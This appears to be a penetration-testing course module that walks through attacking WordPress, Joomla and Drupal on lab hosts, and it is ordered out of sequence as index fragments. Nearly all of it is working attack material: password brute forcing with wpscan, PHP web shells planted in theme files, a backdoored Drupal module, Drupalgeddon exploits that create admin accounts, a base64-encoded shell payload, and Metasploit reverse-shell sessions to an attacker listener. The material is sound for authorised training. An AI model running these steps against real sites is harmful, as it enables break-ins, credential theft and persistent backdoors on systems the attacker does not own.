(Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://blog.inlanefreight.local/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] WordPress version 5.8 identified (Insecure, released on 2021-07-20). | Found By: Rss Generator (Passive Detection) | - http://blog.inlanefreight.local/?feed=rss2, <generator>https://wordpress.org/?v=5.8</generator> | - http://blog.inlanefreight.local/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.8</generator> | | [!] 3 vulnerabilities identified: | | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API | Fixed in: 5.8.1 | References: | - https://wpvulndb.com/vulnerabilities/38dd7e87-9a22-48e2-bab1-dc79448ecdfb | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200 | - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/ | - https://github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706 | - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5 | | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor | Fixed in: 5.8.1 | References: | - https://wpvulndb.com/vulnerabilities/5b754676-20f5-4478-8fd3-6bc383145811 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201 | - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/ | - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v | | [!] Title: WordPress 5.4 to 5.8 - Lodash Library Update | Fixed in: 5.8.1 | References: | - https://wpvulndb.com/vulnerabilities/5d6789db-e320-494b-81bb-e678674f4199 | - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/ | - https://github.com/lodash/lodash/wiki/Changelog | - https://github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689 [+] WordPress theme in use: transport-gravity | Location: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/ | Latest Version: 1.0.1 (up to date) | Last Updated: 2020-08-02T00:00:00.000Z | Readme: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/readme.txt | [!] Directory listing is enabled | Style URL: http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css | Style Name: Transport Gravity | Style URI: https://keonthemes.com/downloads/transport-gravity/ | Description: Transport Gravity is an enhanced child theme of Business Gravity. Transport Gravity is made for tran... | Author: Keon Themes | Author URI: https://keonthemes.com/ | | Found By: Css Style In Homepage (Passive Detection) | Confirmed By: Urls In Homepage (Passive Detection) | | Version: 1.0.1 (80% confidence) | Found By: Style (Passive Detection) | - http://blog.inlanefreight.local/wp-content/themes/transport-gravity/style.css, Match: 'Version: 1.0.1' [+] Enumerating Vulnerable Plugins (via Passive Methods) [+] Checking Plugin Versions (via Passive and Aggressive Methods) [i] Plugin(s) Identified: [+] mail-masta | Location: http://blog.inlanefreight.local/wp-content/plugins/mail-masta/ | Latest Version: 1.0 (up to date) | Last Updated: 2014-09-19T07:52:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | [!] 2 vulnerabilities identified: | | [!] Title: Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI) <SNIP> | [!] Title: Mail Masta 1.0 - Multiple SQL Injection <SNIP | Version: 1.0 (100% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt | Confirmed By: Readme - ChangeLog Section (Aggressive Detection) | - http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt <SNIP> [i] User(s) Identified: [+] by: admin | Found By: Author Posts - Display Name (Passive Detection) [+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] john | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) WPScan uses various passive and active methods to determine versions and vulnerabilities. The default number of threads used is 5. This value can be changed using the -t flag. Bombining both manual and automated enumeration, can be applied to almost any application we uncover. Scanners are great and are very useful but cannot replace the human touch and a curious mind. Honing our enumeration skills can set us apart from the crowd as excellent penetration testers. Attacking WordPress \u00b6 There are several ways we can abuse built-in functionality to attack a WordPress installation. Login Bruteforce \u00b6 The wp-login method will attempt to brute force the standard WordPress login page, while the xmlrpc method uses WordPress API to make login attempts through /xmlrpc.php . hrmns@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local [+] URL: http://blog.inlanefreight.local/ [10.129.42.195] [+] Started: Wed Aug 25 11:56:23 2021 <SNIP> [+] Performing password attack on Xmlrpc against 1 user/s [SUCCESS] - john / firebird1 Trying john / bettyboop Time: 00:00:13 < > (660 / 14345052) 0.00% ETA: ??:??:?? [!] Valid Combinations Found: | Username: john, Password: firebird1 [!] No WPVulnDB API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up [+] Finished: Wed Aug 25 11:56:46 2021 [+] Requests Done: 799 [+] Cached Requests: 39 [+] Data Sent: 373.152 KB [+] Data Received: 448.799 KB [+] Memory used: 221 MB [+] Elapsed time: 00:00:23 Code Execution \u00b6 With administrative access to WordPress, we can modify the PHP source code to execute system commands. Click on Appearance on the side panel and select Theme Editor. This page will let us edit the PHP source code directly. An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead. Click on Select after selecting the theme, and we can edit an uncommon page such as **404.php **to add a web shell. system($_GET[0]); The code above should let us execute commands via the GET parameter 0 . We add this single line to the file just below the comments to avoid too much modification of the contents. Click on Update File at the bottom to save. We know that WordPress themes are located at /wp-content/themes/<theme name> . We can interact with the web shell via the browser or using cURL . hrmns@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0 = id uid=33(www-data) gid=33(www-data) groups=33(www-data) The wp_admin_shell_upload module from Metasploit can be used to upload a shell and execute it automatically. msf6 > use exploit/unix/webapp/wp_admin_shell_upload [*] No payload configured, defaulting to php/meterpreter/reverse_tcp msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195 msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local We must specify both the vhost and the IP address, or the exploit will fail with the error Exploit aborted due to failure: not-found: The target does not appear to be using WordPress . msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit [*] Started reverse TCP handler on 10.10.14.15:4444 [*] Authenticating with WordPress using doug:jessica1... [+] Authenticated with WordPress [*] Preparing payload... [*] Uploading payload... [*] Executing the payload at /wp-content/plugins/CczIptSXlr/wCoUuUPfIO.php... [*] Sending stage (39264 bytes) to 10.129.42.195 [*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:42816) at 2021-09-20 19:43:46 -0400 i[+] Deleted wCoUuUPfIO.php [+] Deleted CczIptSXlr.php [+] Deleted ../CczIptSXlr meterpreter > getuid Server username: www-data (33) In the above example, the Metasploit module uploaded the wCoUuUPfIO.php file to the /wp-content/plugins directory. Many Metasploit modules (and other tools) attempt to clean up after themselves, but some fail. During an assessment, we would want to make every attempt to clean up this artifact from the client system and, regardless of whether we were able to remove it or not, we should list this artifact in our report appendices. At the very least, our report should have an appendix section that lists the following information Exploited systems (hostname/IP and method of exploitation) Compromised users (account name, method of compromise, account type (local or domain)) Artifacts created on systems Changes (such as adding a local admin user or modifying group membership) Joomla - Discovery & Enumeration \u00b6 We can often fingerprint Joomla by looking at the page source, which tells us that we are dealing with a Joomla site. hrmns@htb[/htb]$ curl -s http://dev.inlanefreight.local/ | grep Joomla <meta name=\"generator\" content=\"Joomla! - Open Source Content Management\" /> <SNIP> robots.txt file for a Joomla site will often look like this: # If the Joomla site is installed within a folder # eg www.example.com/joomla/ then the robots.txt file # MUST be moved to the site root # eg www.example.com/robots.txt # AND the joomla folder name MUST be prefixed to all of the # paths. # eg the Disallow rule for the /administrator/ folder MUST # be changed to read # Disallow: /joomla/administrator/ # # For more information about the robots.txt standard, see: # https://www.robotstxt.org/orig.html User-agent: * Disallow: /administrator/ Disallow: /bin/ Disallow: /cache/ Disallow: /cli/ Disallow: /components/ Disallow: /includes/ Disallow: /installation/ Disallow: /language/ Disallow: /layouts/ Disallow: /libraries/ Disallow: /logs/ Disallow: /modules/ Disallow: /plugins/ Disallow: /tmp/ Can fingerprint the Joomla version if the README.txt file is present. hrmns@htb[/htb]$ curl -s http://dev.inlanefreight.local/README.txt | head -n 5 1- What is this? * This is a Joomla! installation/upgrade package to version 3.x * Joomla! Official site: https://www.joomla.org * Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history * Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the media/system/js/ directory or by browsing to administrator/manifests/files/joomla.xml . hrmns@htb[/htb]$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format - <?xml version=\"1.0\" encoding=\"UTF-8\"?> <extension version=\"3.6\" type=\"file\" method=\"upgrade\"> <name>files_joomla</name> <author>Joomla! Project</author> <authorEmail>admin@joomla.org</authorEmail> <authorUrl>www.joomla.org</authorUrl> <copyright>(C) 2005 - 2019 Open Source Matters. All rights reserved</copyright> <license>GNU General Public License version 2 or later; see LICENSE.txt</license> <version>3.9.4</version> <creationDate>March 2019</creationDate> <SNIP> The cache.xml file can help to give us the approximate version. It is located at plugins/system/cache/cache.xml . Enumeration \u00b6 droopescan , a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle. Run a scan and see what it turns up. hrmns@htb[/htb]$ droopescan scan joomla --url http://dev.inlanefreight.local/ [+] Possible version(s): 3.8.10 3.8.11 3.8.11-rc 3.8.12 3.8.12-rc 3.8.13 3.8.7 3.8.7-rc 3.8.8 3.8.8-rc 3.8.9 3.8.9-rc [+] Possible interesting urls found: Detailed version information. - http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml Login page. - http://dev.inlanefreight.local/administrator/ License file. - http://dev.inlanefreight.local/LICENSE.txt Version attribute contains approx version - http://dev.inlanefreight.local/plugins/system/cache/cache.xml [+] Scan finished (0:00:01.523369 elapsed) We can also try out JoomlaScan , which is a Python tool inspired by the now-defunct OWASP joomscan tool. JoomlaScan is a bit out-of-date and requires Python2.7 to run. We can get it running by first making sure some dependencies are installed. hrmns@htb[/htb]$ sudo python2.7 -m pip install urllib3 hrmns@htb[/htb]$ sudo python2.7 -m pip install certifi hrmns@htb[/htb]$ sudo python2.7 -m pip install bs4 While a bit out of date, it can be helpful in our enumeration. hrmns@htb[/htb]$ python2.7 joomlascan.py -u http://dev.inlanefreight.local ------------------------------------------- Joomla Scan Usage: python joomlascan.py <target> Version 0.5beta - Database Entries 1233 created by Andrea Draghetti ------------------------------------------- Robots file found: > http://dev.inlanefreight.local/robots.txt No Error Log found Start scan...with 10 concurrent threads! Component found: com_actionlogs > http://dev.inlanefreight.local/index.php?option=com_actionlogs On the administrator components Component found: com_admin > http://dev.inlanefreight.local/index.php?option=com_admin On the administrator components Component found: com_ajax > http://dev.inlanefreight.local/index.php?option=com_ajax But possibly it is not active or protected LICENSE file found > http://dev.inlanefreight.local/administrator/components/com_actionlogs/actionlogs.xml LICENSE file found > http://dev.inlanefreight.local/administrator/components/com_admin/admin.xml LICENSE file found > http://dev.inlanefreight.local/administrator/components/com_ajax/ajax.xml Explorable Directory > http://dev.inlanefreight.local/components/com_actionlogs/ Explorable Directory > http://dev.inlanefreight.local/administrator/components/com_actionlogs/ Explorable Directory > http://dev.inlanefreight.local/components/com_admin/ Explorable Directory > http://dev.inlanefreight.local/administrator/components/com_admin/ Component found: com_banners > http://dev.inlanefreight.local/index.php?option=com_banners But possibly it is not active or protected Explorable Directory > http://dev.inlanefreight.local/components/com_ajax/ Explorable Directory > http://dev.inlanefreight.local/administrator/components/com_ajax/ LICENSE file found > http://dev.inlanefreight.local/administrator/components/com_banners/banners.xml <SNIP> This tool can help us find accessible directories and files and may help with fingerprinting installed extensions. Default administrator account on Joomla installs is admin, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing. We can use this script to attempt to brute force the login. hrmns@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin admin:admin Attacking Joomla \u00b6 Using the credentials that we obtained in the examples from the last section, let's log in to the target backend at http://dev.inlanefreight.local/administrator . Once logged in, we can see many options available to us. For our purposes, we would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template. From here, click on Templates on the bottom left under Configuration to pull up the templates menu. Next, we can click on a template name. Let's choose protostar under the Template column header. This will bring us to the Templates: Customise page. Click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a \"drive-by\" attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client. Let's choose the error.php page. We'll add a PHP one-liner to gain code execution as follows. system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); Click on Save & Close at the top and confirm code execution using cURL . hrmns@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php/error.php?dcfdd5e021a869fcc6dfaef8bf31377e = id uid=33(www-data) gid=33(www-data) groups=33(www-data) From here, we can upgrade to an interactive reverse shell and begin looking for local privilege escalation vectors or focus on lateral movement within the corporate network. Note down this change for our report appendices and make every effort to remove the PHP snippet from the error.php page. Leveraging Known Vulnerabilities \u00b6 Researching a bit, we find that this version of Joomla is likely vulnerable to CVE-2019-10945 which is a directory traversal and authenticated file deletion vulnerability. We can use this exploit script to leverage the vulnerability and list the contents of the webroot and other directories. As pentesters, this would only be useful to us if the admin login portal is not accessible from the outside since, armed with admin creds, we can gain remote code execution, as we saw above. hrmns@htb[/htb]$ python2.7 joomla_dir_trav.py --url \"http://dev.inlanefreight.local/administrator/\" --username admin --password admin --dir / # Exploit Title: Joomla Core ( 1 .5.0 through 3 .9.4 ) - Directory Traversal && Authenticated Arbitrary File Deletion # Web Site: Haboob.sa # Email: research@haboob.sa # Versions: Joomla 1 .5.0 through Joomla 3 .9.4 # https://cve.mitre.org/cgi-bin/cvename.cgi?name = CVE-2019-10945 _ _ ____ ____ ____ ____ | | | | /\\ | _ \\ / __ \\ / __ \\| _ \\ | |__| | / \\ | |_) | | | | | | | |_) | | __ | / /\\ \\ | _ <| | | | | | | _ < | | | |/ ____ \\| |_) | |__| | |__| | |_) | |_| |_/_/ \\_\\____/ \\____/ \\____/|____/ administrator bin cache cli components images includes language layouts libraries media modules plugins templates tmp LICENSE.txt README.txt configuration.php htaccess.txt index.php robots.txt web.config.txt Drupal - Discovery & Enumeration \u00b6 Drupal is written in PHP and supports using MySQL or PostgreSQL for the backend. A Drupal website can be identified in several ways, including by the header or footer message Powered by Drupal , the standard Drupal logo, the presence of a CHANGELOG.txt file or README.txt file, via the page source, or clues in the robots.txt file such as references to /node . hrmns@htb[/htb]$ curl -s http://drupal.inlanefreight.local | grep Drupal <meta name=\"Generator\" content=\"Drupal 8 (https://www.drupal.org)\" /> <span>Powered by <a href=\"https://www.drupal.org\">Drupal</a></span> Another way to identify Drupal CMS is through nodes . Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form /node/<nodeid> . Enumeration \u00b6 Newer installs of Drupal by default block access to the** CHANGELOG.txt** and README.txt files, so we may need to do further enumeration. Enumerate the version number using the CHANGELOG.txt file. Use cURL along with grep, sed, head, etc. hrmns@htb[/htb]$ curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 \"\" Drupal 7.57, 2018-02-21 Identified an older version of Drupal in use. Trying this against the latest Drupal version at the time of writing, we get a 404 response. hrmns@htb[/htb]$ curl -s http://drupal.inlanefreight.local/CHANGELOG.txt <!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL \"http://drupal.inlanefreight.local/CHANGELOG.txt\" was not found on this server.</p></body></html> Try a scan with droopescan . Droopescan has much more functionality for Drupal than it does for Joomla. hrmns@htb[/htb]$ droopescan scan drupal -u http://drupal.inlanefreight.local [+] Plugins found: php http://drupal.inlanefreight.local/modules/php/ http://drupal.inlanefreight.local/modules/php/LICENSE.txt [+] No themes found. [+] Possible version(s): 8.9.0 8.9.1 [+] Possible interesting urls found: Default admin - http://drupal.inlanefreight.local/user/login [+] Scan finished (0:03:19.199526 elapsed) Appears to be running version 8.9.1 of Drupal. A quick search for Drupal-related vulnerabilities does not show anything apparent for this core version of Drupal. We would next want to look at installed plugins or abusing built-in functionality. Attacking Drupal \u00b6 Unlike some CMS', obtaining a shell on a Drupal host via the admin console is not as easy as just editing a PHP file found within a theme or uploading a malicious PHP script. Leveraging the PHP Filter Module \u00b6 In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the PHP filter module, which \"Allows embedded PHP code/snippets to be evaluated.\" Tick the check box next to the module and scroll down to Save configuration . Next, we could go to Content \u2192 Add content and create a Basic page . We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common cmd to get in the practice of not potentially leaving a door open to an attacker during our assessment. If we used the standard system($_GET['cmd']); we open up ourselves up to a \"drive-by\" attacker potentially coming across our web shell. Though unlikely, better safe than sorry! <?php system ( $_GET [ 'dcfdd5e021a869fcc6dfaef8bf31377e' ]); ?> Make sure to set Text format drop-down to PHP code . After clicking save, we will be redirected to the new page, in this example http://drupal-qa.inlanefreight.local/node/3 . Once saved, we can either request execute commands in the browser by appending ?dcfdd5e021a869fcc6dfaef8bf31377e=id to the end of the URL to run the id command or use cURL on the command line. From here, we could use a bash one-liner to obtain reverse shell access. hrmns@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e = id | grep uid | cut -f4 -d \">\" uid=33(www-data) gid=33(www-data) groups=33(www-data) From version 8 onwards, the PHP Filter module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client's Drupal instance, we may want to check with them first. hrmns@htb[/htb]$ wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz Once downloaded go to Administration > Reports > Available updates . Location may differ based on the Drupal version and may be under the Extend menu. Click on Browse , select the file from the directory we downloaded it to, and then click Install . Once installed, click on Content and create a new basic page. be sure to select PHP code from the Text format dropdown. Uploading a Backdoored Module \u00b6 Drupal allows users with appropriate permissions to upload a new module. A backdoored module can be created by adding a shell to an existing module. Modules can be found on the drupal.org website. Let's pick a module such as CAPTCHA . Scroll down and copy the link for the tar.gz archive . hrmns@htb[/htb]$ wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz hrmns@htb[/htb]$ tar xvf captcha-8.x-1.2.tar.gz Create PHP web shell <?php system ( $_GET [ fe8edbabc5c5c9b7b764504cd22b17af ]); ?> We need to create a .htaccess file to give ourselves access to the folder. This is necessary as Drupal denies direct access to the /modules folder. < IfModule mod_rewrite . c > RewriteEngine On RewriteBase / </ IfModule > The configuration above will apply rules for the / folder when we request a file in /modules. Copy both of these files to the captcha folder and create an archive. hrmns@htb[/htb]$ mv shell.php .htaccess captcha hrmns@htb[/htb]$ tar cvf captcha.tar.gz captcha/ captcha/ captcha/.travis.yml captcha/README.md captcha/captcha.api.php captcha/captcha.inc captcha/captcha.info.yml captcha/captcha.install <SNIP> Assuming we have administrative access to the website, click on Manage and then Extend on the sidebar. Next, click on the + Install new module button, and we will be taken to the install page, such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdoored Captcha archive and click Install . Once the installation succeeds, browse to /modules/captcha/shell.php to execute commands. hrmns@htb[/htb]$ curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af = id uid=33(www-data) gid=33(www-data) groups=33(www-data) Drupalgeddon \u00b6 This flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user. Let's try adding a new admin user with this PoC script. Once an admin user is added, we could log in and enable the PHP Filter module to achieve remote code execution. hrmns@htb[/htb]$ python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd <SNIP> [!] VULNERABLE! [!] Administrator user created! [*] Login: hacker [*] Pass: pwnd [*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node Let's see if we can log in as an admin. We can! Now from here, we could obtain a shell through the various means discussed previously Could also use the exploit/multi/http/drupal_drupageddon Metasploit module to exploit this. Drupalgeddon2 \u00b6 Use this PoC to confirm this vulnerability. hrmns@htb[/htb]$ python3 drupalgeddon2.py # ############################################################### # Proof-Of-Concept for CVE-2018-7600 # by Vitalii Rudnykh # Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders # https://github.com/a2u/CVE-2018-7600 # ############################################################### Provided only for educational or information purposes Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/ Check: http://drupal-dev.inlanefreight.local/hello.txt Can check quickly with cURL and see that the hello.txt file was indeed uploaded. hrmns@htb[/htb]$ curl -s http://drupal-dev.inlanefreight.local/hello.txt ;-) Modify the script to gain remote code execution by uploading a malicious PHP file. <?php system ( $_GET [ fe8edbabc5c5c9b7b764504cd22b17af ]); ?> hrmns@htb[/htb]$ echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64 PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K Let's replace the echo command in the exploit script with a command to write out our malicious PHP script. echo \"PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K\" | base64 -d | tee mrb3n.php Run the modified exploit script to upload our malicious PHP file. hrmns@htb[/htb]$ python3 drupalgeddon2.py # ############################################################### # Proof-Of-Concept for CVE-2018-7600 # by Vitalii Rudnykh # Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders # https://github.com/a2u/CVE-2018-7600 # ############################################################### Provided only for educational or information purposes Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/ Check: http://drupal-dev.inlanefreight.local/mrb3n.php Confirm remote code execution using cURL . hrmns@htb[/htb]$ curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af = id uid=33(www-data) gid=33(www-data) groups=33(www-data) Drupalgeddon3 \u00b6 Drupalgeddon3 is an authenticated remote code execution vulnerability that affects multiple versions of Drupal core. It requires a user to have the ability to delete a node. We can exploit this using Metasploit, but we must first log in and obtain a valid session cookie. Once we have the session cookie, we can set up the exploit module msf6 exploit(multi/http/drupal_drupageddon3) > set rhosts 10.129.42.195 msf6 exploit(multi/http/drupal_drupageddon3) > set VHOST drupal-acc.inlanefreight.local msf6 exploit(multi/http/drupal_drupageddon3) > set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y msf6 exploit(multi/http/drupal_drupageddon3) > set DRUPAL_NODE 1 msf6 exploit(multi/http/drupal_drupageddon3) > set LHOST 10.10.14.15 msf6 exploit(multi/http/drupal_drupageddon3) > show options Module options (exploit/multi/http/drupal_drupageddon3): Name Current Setting Required Description ---- --------------- -------- ----------- DRUPAL_NODE 1 yes Exist Node Number (Page, Article, Forum topic, or a Post) DRUPAL_SESSION SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y yes Authenticated Cookie Session Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.129.42.195 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>' RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes The target URI of the Drupal installation VHOST drupal-acc.inlanefreight.local no HTTP server virtual host Payload options (php/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.15 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 User register form with exec If successful, we will obtain a reverse shell on the target host. msf6 exploit(multi/http/drupal_drupageddon3) > exploit [*] Started reverse TCP handler on 10.10.14.15:4444 [*] Token Form -> GH5mC4x2UeKKb2Dp6Mhk4A9082u9BU_sWtEudedxLRM [*] Token Form_build_id -> form-vjqTCj2TvVdfEiPtfbOSEF8jnyB6eEpAPOSHUR2Ebo8 [*] Sending stage (39264 bytes) to 10.129.42.195 [*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:44612) at 2021-08-24 12:38:07 -0400 meterpreter > getuid Server username: www-data (33) meterpreter > sysinfo Computer : app01 OS : Linux app01 5.4.0-81-generic #91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64 Meterpreter : php/linux","title":"Content Management Systems"},{"location":"attacking_common_apps/content_management_systems/#wordpress","text":"","title":"WordPress"},{"location":"attacking_common_apps/content_management_systems/#discoveryfootprinting","text":"A quick way to identify a WordPress site is by browsing to the **/robots.txt**file. A typical robots.txt on a WordPress installation may look like: User-agent: * Disallow: /wp-admin/ Allow: /wp-admin/admin-ajax.php Disallow: /wp-content/uploads/wpforms/ Sitemap: https://inlanefreight.local/wp-sitemap.xml Here the presence of the /wp-admin and /wp-content directories would be a dead giveaway that we are dealing with WordPress. Typically attempting to browse to the wp-admin directory will redirect us to the wp-login.php page. WordPress stores its plugins in the wp-content/plugins directory. This folder is helpful to enumerate vulnerable plugins. Themes are stored in the wp-content/themes directory. These files should be carefully enumerated as they may lead to RCE.","title":"Discovery/Footprinting"},{"location":"attacking_common_apps/content_management_systems/#enumeration","text":"Viewing the page with cURL and grepping for WordPress can help us confirm that WordPress is in use and footprint the version number, which we should note down for later. hrmns@htb[/htb]$ curl -s http://blog.inlanefreight.local | grep WordPress <meta name=\"generator\" content=\"WordPress 5.8\" / Browsing the site and perusing the page source will give us hints to the theme in use, plugins installed, and even usernames if author names are published with posts. hrmns@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep themes <link rel='stylesheet' id='bootstrap-css' href='http://blog.inlanefreight.local/wp-content/themes/business-gravity/assets/vendors/bootstrap/css/bootstrap.min.css' type='text/css' media='all' /> Take a look at which plugins we can uncover. hrmns@htb[/htb]$ curl -s http://blog.inlanefreight.local/ | grep plugins <link rel='stylesheet' id='contact-form-7-css' href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' /> <script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.8' id='subscriber-js-js'></script> <script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.8' id='validation-engine-en-js'></script> <script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.8' id='validation-engine-js'></script> <link rel='stylesheet' id='mm_frontend-css' href='http://blog.inlanefreight.local/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.8' type='text/css' media='all' /> <script type='text/javascript' src='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/js/index.js?ver=5.4.2' id='contact-form-7-js'></script> From the output above, we know that the Contact Form 7 and mail-masta plugins are installed. The next step would be enumerating the versions. Browsing to http://blog.inlanefreight.local/wp-content/plugins/mail-masta/ shows us that directory listing is enabled and that a readme.txt file is present. Checking the page source of another page, we can see that the wpDiscuz plugin is installed, and it appears to be version 7.0.4 hrmns@htb[/htb]$ curl -s http://blog.inlanefreight.local/?p = 1 | grep plugins <link rel='stylesheet' id='contact-form-7-css' href='http://blog.inlanefreight.local/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.4.2' type='text/css' media='all' /> <link rel='stylesheet' id='wpdiscuz-frontend-css-css' href='http://blog.inlanefreight.local/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4' type='text/css' media='all' /> A quick search for this plugin version shows this unauthenticated remote code execution vulnerability from June of 2021. We'll note this down and move on. It is important at this stage to not jump ahead of ourselves and start exploiting the first possible flaw we see, as there are many other potential vulnerabilities and misconfigurations possible in WordPress that we don't want to miss.","title":"Enumeration"},{"location":"attacking_common_apps/content_management_systems/#enumerating-users","text":"The default WordPress login page can be found at /wp-login.php . A valid username and an invalid password results in the following message: An ivalid username returns that the user was not found: This makes WordPress vulnerable to username enumeration, which can be used to obtain a list of potential usernames.","title":"Enumerating Users"},{"location":"attacking_common_apps/content_management_systems/#wpscan","text":"WPScan is also able to pull in vulnerability information from external sources. hrmns@htb[/htb]$ sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP> <SNIP> [+] URL: http://blog.inlanefreight.local/ [10.129.42.195] [+] Started: Thu Sep 16 23:11:43 2021 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.41 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: 